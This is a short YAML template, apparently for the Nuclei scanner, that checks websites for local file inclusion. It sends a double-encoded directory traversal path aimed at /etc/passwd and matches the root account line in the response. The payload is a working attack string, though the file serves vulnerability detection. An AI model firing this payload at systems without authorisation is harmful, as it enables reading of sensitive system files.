id: lfi

info:
  name: Local File Inclusion
  author: rix4uni
  severity: high
  description: local file inclusion
  reference: https://twitter.com/nav1n0x/status/1622529068557078528?s=20
  metadata:
    verified: true
  tags: lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200